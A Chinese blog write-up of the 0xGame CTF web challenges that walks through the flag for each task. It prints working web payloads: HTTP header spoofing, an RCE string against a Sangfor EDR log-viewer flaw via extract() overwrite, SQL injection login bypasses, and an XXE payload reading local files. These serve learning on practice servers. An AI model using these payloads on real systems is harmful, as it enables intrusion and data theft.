---
title: 0XGame WEB Write-up
date: 2020-10-10 16:57:25
updated: 
comments: false
tags: 
  - robots协议
  - XFF
  - SQL注入
  - XXE
categories: 
  - Write-Up
permalink: 
---

by:gyy
<h2>robots协议</h2>
<h3>考察robots协议</h3>
<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30051/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30051/</a></h5>
知识链接：

robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。

直接访问./robots.php ->
<pre><code>User-agent: *
Allow: /
User-agent: CTFer
Disallow: /flaaaggg.php
</code></pre>
<h3>最终</h3>
访问/flaaaggg.php即可

问题解决：0xGame{now_you_k0nw_robots_Protocol}

<hr />
<h2>view_source</h2>
<h3>考察会不会看源码</h3>
<h3>最终</h3>
f12看源码就行

问题解决：0xGame{web_sign_in}

<hr />
<h2>get&post</h2>
<h3>考察get与post的应用</h3>
打开直接给代码
<pre><code class="language-php" lang="php"><?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['0xGame']) && isset($_POST['X1cT34m'])){
    $a = $_GET['0xGame'];
    $b = $_POST['X1cT34m'];
    $c = 'acd666tql';
    if($a === $c && $b === $c){
        echo $flag;
    }
}else{
    die("Do you konw GET & POST ?");
}
</code></pre>
代码审计，get传参，post传参即可
<h3>最终</h3>
payload：<code>./?0xGame=acd666tql</code>
post:<code>X1cT34m=acd666tql</code>

问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}

<hr />
<h2>wh1sper's_secret_garden</h2>
<h3>考察http协议</h3>
<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30050/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30050/</a></h5>
打开发现：
<pre><code>你需要使用wh1sper浏览器来访问
什么？没有？
没有wh1sper浏览器还想打web？
</code></pre>
抓包改包,浏览器改成wh1sper
<pre><code>GET / HTTP/1.1
Host: web.game.0xctf.com:30050
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) wh1sper/84.0.4147.135 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

</code></pre>
然后发现
<pre><code>你需要来自：https://ctf.njupt.edu.cn/
</code></pre>
伪造地址三种方式：
<pre><code>Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Host: 127.0.0.1
Referer: 127.0.0.1
</code></pre>
这里<code>Referer: https://ctf.njupt.edu.cn/</code>

再发包，发现
<pre><code>你得从本地访问才行哟！
</code></pre>
改包，加上<code>X-Forwarded-For: 127.0.0.1</code>
<h3>最终</h3>
发包：
<pre><code>GET / HTTP/1.1
Host: web.game.0xctf.com:30050
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Referer: https://ctf.njupt.edu.cn/
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) wh1sper/84.0.4147.135 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

</code></pre>
问题解决：0xGame{宁就是接头霸王?}

<hr />
<h2>readflag</h2>
<h3>考察linux指令</h3>
<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30054/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30054/</a></h5>
进去看到<code>请输入linux指令</code>
<h3>最终</h3>
直接cat /flag

问题解决：0xGame{fl4g_1s_c0ntent}

<hr />
<h2>edr</h2>
<h3>考察edr和搜索引擎</h3>
<h5>题目地址：<a class="url" href="http://web1.game.0xctf.com:40000/" target="_blank" rel="noopener noreferrer">http://web1.game.0xctf.com:40000/</a></h5>
深信服edr的漏洞

这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a>

源码在这
<pre><code class="language-php" lang="php"><?php
/**
 * c.php
 * 查看ldb的日志
 * 支持正则表达式过滤，可以过滤文件以及每行日志
 */

call_user_func(function() {
    /**
     * 编解码
     * @param string $data 编解码数据
     * @return string 返回编解码数据
     */
    $code = function($data) {
        for ($i = 0; $i < strlen($data); ++$i) {
            $data[$i] = $data[$i] ^ 'G';
        }
        return $data;
    };
    
    /**
     * 加密请求
     * @param string $site  站点
     * @param string $query 请求串
     * @return string 返回请求URL
     */
    $request = function($site, $query) use(&$code) {
        $path = base64_encode($code($query));
        return "$site/$path";
    };
    
    /**
     * 解密回复
     * @param string $data 回复数据
     * @return array 返回回复数据
     */
    $response = function($data) use(&$code) {
        $ret = json_decode($data, true);
        if (is_null($ret)) {
            $dec = $code(base64_decode($data));
            $ret = json_decode($dec, true);
        }
        return $ret;
    };
    
    /**
     * 找到匹配的日志
     * @param string $path 文件路径匹配
     * @param string $item 日志项匹配
     * @param string $topn TOP N 
     * @param string $host 主机
     * @return array 返回匹配结果
     */
    $collect = function($path, $item, $topn, $host) use(&$request, &$response) {
        $path   = urlencode($path);
        $item   = urlencode($item);
        $result = file_get_contents($request("http://127.0.0.1:8089", "op=ll&host=$host&path=$path&item=$item&top=$topn"));
        return $response($result);
    };
    
    /**
     * 显示某个表单域
     * @param array $info 表单域信息, array("name" => "xx", "value" => "xxx", "note" => "help");
     * @return
     */
    $show_input = function($info) {
        extract($info);
        $value = htmlentities($value);
        echo "<p><font size=2>$title: </font><input type=\"text\" size=30 id=\"$name\" name=\"$name\" value=\"$value\"><font size=2>$note</font></p>";
    };
    
    /**
     * 去掉反斜杠
     * @param string $var 值
     * @return string 返回去掉反斜杠的值
     */
    $strip_slashes = function($var) {
        if (!get_magic_quotes_gpc()) {
            return $var;
        }
        return stripslashes($var);
    };
    
    /**
     * 显示表单
     * @param array $params 请求参数
     * @return
     */
    $show_form = function($params) use(&$strip_slashes, &$show_input) {
        extract($params);
        $host  = isset($host)  ? $strip_slashes($host)  : "127.0.0.1";
        $path  = isset($path)  ? $strip_slashes($path)  : "";
        $row   = isset($row)   ? $strip_slashes($row)   : "";
        $limit = isset($limit) ? $strip_slashes($limit) : 1000;
        
        // 绘制表单
        echo "<pre>";
        echo '<form id="studio" name="studio" method="post" action="">';
        $show_input(array("title" => "Host ",  "name" => "host",  "value" => $host,  "note" => " - host, e.g. 127.0.0.1"));
        $show_input(array("title" => "Path ",  "name" => "path",  "value" => $path,  "note" => " - path regex, e.g. mapreduce"));
        $show_input(array("title" => "Row  ",  "name" => "row",   "value" => $row,   "note" => " - row regex, e.g. \s[w|e]\s"));
        $show_input(array("title" => "Limit",  "name" => "limit", "value" => $limit, "note" => " - top n, e.g. 100"));
        echo '<input type="submit" id="button">';
        echo '</form>';
        echo "</pre>";
    };
    
    /**
     * 入口函数
     * @param array $argv 配置参数
     * @return
     */
    $main = function($argv) 
        use(&$collect) {
        extract($argv);
        if (!isset($limit)) {
            return;
        }
        $result = $collect($path, $row, $limit, $host);
        if (!is_array($result)) {
            echo $result, "\n";
            return;
        }
        if (!isset($result["success"]) || $result["success"] !== true) {
            echo $result, "\n";
            return;
        }
        foreach ($result["data"] as $host => $items) {
            $last = "";
            foreach ($items as $item) {
                if ($item["name"] != $last) {
                    $last = $item["name"];
                    echo "\n[$host] -> $last\n\n";
                }
                echo $item["item"], "\n";
            }
        }
    };
    
    set_time_limit(0);
    echo '<html><head><meta http-equiv="Content-Type" Content="text/html; Charset=utf-8"></head>';
    echo '<body bgcolor="#e8ddcb">';
    echo "<p><b>Log Helper</b></p>";
    $show_form($_REQUEST);
    echo "<pre>";
    $main($_REQUEST);
    echo "</pre>";  
});

highlight_file(__FILE__);
?>
</code></pre>
可以任意文件读取下载
<h3>最终</h3>
payload：./?strip_slashes=system&host=cat /flag

问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}

<hr />
<h2>just_login</h2>
<h3>burp爆破</h3>
<h4>题目地址：<a class="url" href="http://web.game.0xctf.com:30055/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30055/</a></h4>
dirsearch扫不到东西

sqlmap跑一下没用

不知道干啥，直接burp抓包用户名爆破
真爆出来了
<h3>最终</h3>
payload：
<pre><code>' or 0=0 #
' or 1=1 or ''='
x' or 1=1 or 'x'='y
</code></pre>
问题解决：0xGame{e5sy_sql_1njeCtion}

<hr />
<h2>close_eyes</h2>
<h3>注入</h3>
<h4>题目地址：<a class="url" href="http://web.game.0xctf.com:30052/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30052/</a></h4>
<hr />
<h2>inject_me</h2>
<h3>XXE显式攻击</h3>
<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30061/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30061/</a></h5>
<h3>最终</h3>
payload：
<pre><code><?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY foo SYSTEM "file:///flag">]>
<user><username>&foo;</username><password>0</password></user>
</code></pre>
问题解决：0xGame{V2ry_simple_XXE}